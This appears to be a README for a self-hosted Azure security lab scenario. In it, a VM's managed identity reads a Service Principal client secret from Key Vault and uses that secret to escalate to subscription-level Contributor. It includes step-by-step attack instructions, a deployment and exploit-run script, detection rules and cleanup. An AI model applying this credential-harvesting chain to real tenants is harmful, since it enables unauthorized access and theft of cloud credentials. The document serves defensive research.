# Z5 — Key Vault Secret Escalation

## Overview

A VM with a System-Assigned **Managed Identity (MI)** is granted the built-in **`Key Vault Secrets User`** role on a single Azure Key Vault. That vault stores a Service Principal's client secret — a common but dangerous pattern where "secret storage" doubles as "cross-service authentication vector". The exploit reads the secret via the MI, exchanges it for a Service Principal token via AAD OAuth2 client-credentials flow, and exercises the SP's subscription-level Contributor scope.

The starting privilege — `Key Vault Secrets User` on one specific vault — is minimal by any policy audit. Nothing about the assignment itself looks anomalous. The escalation is fully in the **content** of the secret, not the permission surface.

## Attack Flow

```
┌───────────────────────────────────────────────────────────────┐
│  VM (System-Assigned MI)                                      │
│    RBAC (data-plane): Key Vault Secrets User on 1 KV          │
│    RBAC (control-plane): none                                 │
└─────────┬─────────────────────────────────────────────────────┘
          │  ① IMDS  → ARM token (resource=management.azure.com)
          │  ② IMDS  → KV token  (resource=vault.azure.net)
          ▼
┌───────────────────────────────────────────────────────────────┐
│  Key Vault (data plane)                                       │
│    GET /secrets/pt-z5-elevated-sp-secret                      │
│    permission required: Key Vault Secrets User ✓              │
│    response: elevated SP's clientSecret                       │
└─────────┬─────────────────────────────────────────────────────┘
          │  ③ secret value = SP clientSecret
          ▼
┌───────────────────────────────────────────────────────────────┐
│  Attacker recon (out-of-band)                                 │
│    obtains SP app_id (in real breach: tags, config secrets,   │
│    hardcoded companion app IDs, DevOps pipeline vars, etc.)   │
└─────────┬─────────────────────────────────────────────────────┘
          │  ④ SP app_id + secret
          ▼
┌───────────────────────────────────────────────────────────────┐
│  AAD OAuth2 token endpoint                                    │
│    POST login.microsoftonline.com/{tenant}/oauth2/v2.0/token  │
│    grant_type=client_credentials                              │
│    scope=https://management.azure.com/.default                │
│    response: SP ARM token                                     │
└─────────┬─────────────────────────────────────────────────────┘
          │  ⑤ SP ARM token
          ▼
┌───────────────────────────────────────────────────────────────┐
│  ARM (control plane) — as the SP                              │
│    PATCH /subscriptions/{sub}/resourceGroups/{rg}/            │
│          providers/Microsoft.Resources/tags/default           │
│    operation=Merge                                            │
│    permission required: Contributor at sub scope ✓ (via SP)   │
│    result: RG tag write succeeds                              │
└───────────────────────────────────────────────────────────────┘
```

## MITRE ATT&CK Mapping

- **T1552.001** — Unsecured Credentials: Credentials In Files (extended to include secure vault as a discovery surface)
- **T1078.004** — Valid Accounts: Cloud Accounts (SP as second-stage identity)
- AWS analogue: **P7** (Lambda env-var credential theft) and **P8** (S3 credential harvest). Same primitive class: credential discovery + off-band credential re-use.

## Prerequisites

- Azure baseline deployed (`environments/baseline_azure_personal/`)
- Personal MSA subscription (D-Z2-01)
- `~/.ssh/id_rsa.pub` present (RSA only; per D-Z4-04)
- `az` CLI logged in with permission to create Service Principals
- Deployer holds Owner (or User Access Administrator + Key Vault Administrator) at subscription scope

## Vulnerable Configuration

Two design decisions produce the vulnerability:

1. **Storing an SP client secret in a Key Vault**. This is the intended use of Key Vault, but combined with a broad SP scope it means "read one secret" grants full subscription authority. Rotating the secret does not close this; the pattern needs replacing (workload identity federation, Managed Identity chaining, or short-lived tokens).
2. **Broad SP privilege at subscription scope**. The stored SP holds Contributor at subscription level. Any principal that can retrieve this secret inherits that authority. Least-privilege violation on the SP itself, but detection requires seeing what the secret grants — invisible to the MI's own permission surface.

## Engineering Decision Log

Only one Z5-specific decision surfaced during verification; the rest are inherited from Z2–Z4.

### D-Z5-01: Use RBAC access model, not legacy access policies

**Observation.** Key Vault supports two authorization models: legacy access policies (per-vault ACL) and RBAC (Azure role assignments). Both work; RBAC is Microsoft's 2020+ recommended model.

**Decision.** Use RBAC (`enable_rbac_authorization = true`). Rationale:
- Consistent with the rest of the Azure catalogue (Z2/Z3/Z4 all use RBAC).
- Aligns with AZ-500 curriculum and current Microsoft Learn recommendations.
- Enables cross-scope role assignments (a KV role at subscription scope, RG scope, or KV-specific scope — matches AWS's flexible policy scoping).

**Consequence for detection.** RBAC operations on Key Vault are visible in `AzureActivity` under `Microsoft.Authorization/roleAssignments/write` with the vault as `scope`. Access policy changes surface differently under `Microsoft.KeyVault/vaults/write` — a separate signal that Z5's RBAC design does not exercise. The defender-output module's Azure counterpart of primitive 04 (credential discovery) covers RBAC-mode KV in its default query; access-policy-mode KV would need a companion query.

**A Z5b variant** using access policies is out of scope for T2 but noted as future work — it would exercise a distinct detection surface.

## Attack Steps

1. Establish SSH access to the VM as `azureuser`.
2. From inside the VM, query IMDS at `169.254.169.254` for an ARM-scoped MI token.
3. Query IMDS again for a Key Vault-scoped MI token (resource=`vault.azure.net`). Azure requires resource-specific tokens; the ARM token does not authenticate against the Key Vault data plane.
4. `GET {vault_uri}/secrets/{name}?api-version=7.4` with `Authorization: Bearer {kv_token}`. Returns the secret value.
5. Obtain the SP `app_id` via out-of-band reconnaissance (in this lab: read from `z5_output.json`; in a real breach: tags on the same secret, companion config secrets, hardcoded environment variables, or DevOps pipeline variables).
6. POST to `https://login.microsoftonline.com/{tenant}/oauth2/v2.0/token` with `grant_type=client_credentials`, `client_id={sp_app_id}`, `client_secret={leaked_secret}`, `scope=https://management.azure.com/.default`. Returns an ARM token as the SP.
7. Use the SP token to `PATCH {rg}/providers/Microsoft.Resources/tags/default` with `operation=Merge`. Succeeds because the SP holds Contributor at subscription scope.

## Running the PoC

```bash
# 0. Context
az account show --query name -o tsv     # personal MSA
export ARM_SUBSCRIPTION_ID=$(az account show --query id -o tsv)
export ARM_TENANT_ID=$(az account show --query tenantId -o tsv)

# 1. Pre-create the elevated SP (not managed by Terraform per D-Z2-01)
SP_NAME="pt-z5-elevated-$(openssl rand -hex 3)"
SP_JSON=$(az ad sp create-for-rbac \
    --name "$SP_NAME" \
    --role "Contributor" \
    --scopes "/subscriptions/$ARM_SUBSCRIPTION_ID" \
    --query '{appId:appId, password:password}' \
    -o json)
export TF_VAR_elevated_sp_app_id=$(echo "$SP_JSON" | jq -r '.appId')
export TF_VAR_elevated_sp_client_secret=$(echo "$SP_JSON" | jq -r '.password')

# 2. Deploy
cd environments/scenarios/Z5_kv_secret_escalation
terraform init && terraform apply -auto-approve
sleep 30    # role propagation

# 3. Ship exploit
terraform output -json > /tmp/z5_output.json
VM_IP=$(jq -r '.vm_public_ip.value' /tmp/z5_output.json)

SSH_OPTS=(-i ~/.ssh/id_rsa \
          -o IdentitiesOnly=yes -o StrictHostKeyChecking=no \
          -o PubkeyAcceptedAlgorithms=+ssh-rsa \
          -o HostKeyAlgorithms=+ssh-rsa)

scp "${SSH_OPTS[@]}" \
    ../../../attacks/Z5_kv_secret_escalation/exploit.py \
    /tmp/z5_output.json azureuser@$VM_IP:~/

# 4. Execute
ssh "${SSH_OPTS[@]}" azureuser@$VM_IP \
    'cloud-init status --wait && \
     python3 exploit.py --tf-output z5_output.json --log verification_log.txt'
```

## Captured Output (PoC Verification)

The full sanitized PoC log is committed as `verification_log.txt`. The raw log (containing actual subscription, tenant, MI principal, Key Vault URI, and SP app ID) is retained in `~/.pathtriage-private/`.

The exploit produces a final verification line of the form:

```
[+] Path Z5 verified: VM MI (Key Vault Secrets User on 1 KV) ->
                      GET secret 'pt-z5-elevated-sp-secret' ->
                      OAuth2 client_credentials with SP creds ->
                      SP token (Contributor at subscription scope) ->
                      RG-wide control-plane writes succeed
```

## Comparison to AWS Analogues

| Dimension | AWS P7 (Lambda env-var) | AWS P8 (S3 tfstate) | Azure Z5 (Key Vault) |
|---|---|---|---|
| Storage surface | Lambda function config | S3 object body | Azure Key Vault secret |
| Credential class stored | Long-term IAM access key | Long-term IAM access key | Azure SP client secret |
| Retrieval action | `lambda:GetFunctionConfiguration` | `s3:GetObject` (credential-named object) | KV data-plane GET `/secrets/{name}` |
| Discovery surface visibility | High (config listing) | High (bucket enumeration) | Low (per-vault, per-secret ARN) |
| Preventive gate | SCP on Lambda env content | SCP on GetObject with pattern | RBAC on KV Secrets User assignments |
| Secret rotation impact | Rotating key closes leak | Rotating key closes leak | Rotating SP secret closes leak, but SP still exists |
| Structural weakness | Config was designed as public metadata | S3 has no content-aware defense | Secret vault IS the intended storage, so audit signal is weaker |

The Azure model is arguably harder to detect: Key Vault is the *recommended* storage location for secrets, so read events look benign. AWS's P7/P8 rely on misconfigurations (secrets in the wrong place); Z5 exploits secrets in the *right* place with insufficient scope control on the identities those secrets represent. Documented as a comparative finding in the defender-output module's `primitive_04` symmetry analysis (to be updated).

## Detection Preview (full rules in W8 defender-output module)

| Signal | Source | Primitive |
|---|---|---|
| KV secret read followed within 5 minutes by AAD sign-in from a Service Principal whose `AppId` matches a value stored in that vault | `AzureDiagnostics` (KV) + `AADSignInLogs` correlated | Credential discovery — read + off-band re-use |
| KV secret read by a principal whose baseline reads no secrets from this vault, followed by any new AAD Service Principal sign-in within the correlation window | Baseline anomaly + AAD correlation | Novel-reader signal |
| Service Principal sign-in from an unexpected caller identity (SP acting from a network path never previously seen) | `AADSignInLogs` alone | Credential compromise, independent of read event |

Note that Key Vault operations must have diagnostic settings enabled for `AuditEvent` category; default deployment does not log data-plane operations. This is itself a preventive control gap — audit gaps enable Z5 to happen silently.

## Cleanup

```bash
cd environments/scenarios/Z5_kv_secret_escalation
terraform destroy -auto-approve

# Remove the pre-created SP
source ~/.pathtriage-private/z5_sp.env
az ad sp delete --id "$TF_VAR_elevated_sp_app_id"
```

Keep `baseline_azure_personal` running for Z6–Z8.

## References

- MITRE ATT&CK [T1552.001 — Credentials In Files](https://attack.mitre.org/techniques/T1552/001/)
- MITRE ATT&CK [T1078.004 — Valid Accounts: Cloud Accounts](https://attack.mitre.org/techniques/T1078/004/)
- Microsoft Learn — [Azure Key Vault RBAC access model](https://learn.microsoft.com/en-us/azure/key-vault/general/rbac-guide)
- Microsoft Learn — [Key Vault Secrets User built-in role](https://learn.microsoft.com/en-us/azure/role-based-access-control/built-in-roles#key-vault-secrets-user)
- Microsoft Learn — [OAuth 2.0 client credentials flow](https://learn.microsoft.com/en-us/entra/identity-platform/v2-oauth2-client-creds-grant-flow)
